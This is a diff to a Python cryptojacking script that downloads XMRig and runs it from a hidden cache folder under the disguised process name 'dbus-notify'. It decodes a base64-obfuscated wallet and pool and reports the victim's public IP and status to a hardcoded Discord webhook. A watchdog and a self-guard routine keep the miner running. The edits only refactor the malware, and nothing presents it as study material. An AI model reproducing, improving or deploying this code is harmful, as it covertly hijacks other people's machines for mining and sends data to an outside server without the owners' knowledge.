@@ -1,6 +1,6 @@
-import os, subprocess, time, socket, threading, requests, base64
+import os, subprocess, time, socket, threading, requests, base64, shutil
 
-# === Obfuscated Config ===
+# Obfuscated config
 WALLET = base64.b64decode("TVJDVUxFMm1rR0tIc0hSZ2l1SDVERlF3Q0NPZDZLZ2JIOHNuclN3M3pHUmU1dUpmNW1SRVVmS0c5a3A2dmlZQVp6b29EaWtKaVRIbmtObGxZaTNQYW9vOVp0cnpYSFJRMTlaMm8=").decode()
 POOL = base64.b64decode("c2UubXJjdWxlLnVyZWJ6dmFyZWYucGJ6OjExMjM=").decode()
 COIN = "zeph"
@@ -8,17 +8,15 @@ THREADS = "4"
 RIG_ID = "sysd0"
 DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"
 
-# === Paths ===
 BIN_DIR = os.path.expanduser("~/.cache/.X11-unix")
 MINER_BIN = os.path.join(BIN_DIR, "dbus-notify")
 LOGFILE = os.path.join(BIN_DIR, "syslog.txt")
 SCRIPT_PATH = os.path.abspath(__file__)
-
 status = {"running": False, "start_time": None}
 
 def run_cmd(cmd):
     try:
-        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
     except:
         return ""
 
@@ -30,8 +28,15 @@ def send_discord(msg):
 
 def install_miner():
     try:
+        # Clean up if dbus-notify is a directory or broken file
         if os.path.isdir(MINER_BIN):
-            subprocess.run(f"rm -rf {MINER_BIN}", shell=True)
+            shutil.rmtree(MINER_BIN)
+        elif os.path.exists(MINER_BIN):
+            try:
+                os.chmod(MINER_BIN, 0o700)
+            except:
+                os.remove(MINER_BIN)
+
         os.makedirs(BIN_DIR, exist_ok=True)
         archive = os.path.join(BIN_DIR, "xmr.tar.gz")
         url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
@@ -44,7 +49,7 @@ def install_miner():
                 break
         os.chmod(MINER_BIN, 0o700)
     except Exception as e:
-        send_discord(f"❌ Miner install error: {e}")
+        send_discord(f"❌ Install error: {e}")
 
 def start_miner():
     if not status["running"]:
@@ -54,7 +59,7 @@ def start_miner():
             subprocess.Popen(cmd.split(), stdout=log, stderr=log)
         status["running"] = True
         status["start_time"] = time.time()
-        send_discord(f"✅ Miner started.\n{get_status()}")
+        send_discord(f"✅ Miner started\n{get_status()}")
 
 def stop_miner():
     run_cmd(f"pkill -f {MINER_BIN}")
@@ -68,15 +73,7 @@ def get_status():
         ip = requests.get("https://api.ipify.org").text.strip()
     except:
         ip = "unknown"
-    return (
-        f"💠 Status\n"
-        f"Miner: {'✅ Running' if status['running'] else '❌ Stopped'}\n"
-        f"IP: {ip}\n"
-        f"Uptime: {uptime // 60} mins\n"
-        f"Worker: {RIG_ID}\n"
-        f"Threads: {THREADS}\n"
-        f"Pool: {POOL}"
-    )
+    return f"💠 Status\nMiner: {'✅ Running' if status['running'] else '❌ Stopped'}\nIP: {ip}\nUptime: {uptime//60} mins\nPool: {POOL}\nThreads: {THREADS}"
 
 def get_hashrate():
     try:
@@ -97,8 +94,7 @@ def watchdog():
     while True:
         time.sleep(10)
         if status["running"]:
-            check = run_cmd(f"pgrep -f {MINER_BIN}")
-            if not check.strip():
+            if not run_cmd(f"pgrep -f {MINER_BIN}").strip():
                 start_miner()
 
 def self_guard():
@@ -112,15 +108,7 @@ def self_guard():
             except:
                 pass
     except:
-        send_discord("❌ Crash:\nNo module named 'psutil'")
-
-def report_log():
-    try:
-        with open(LOGFILE) as f:
-            content = f.read()[-1900:]
-        send_discord(f"📝 Log:\n```{content}```")
-    except:
-        send_discord("📭 Log unavailable.")
+        send_discord("❌ Missing module: psutil")
 
 def main():
     try:
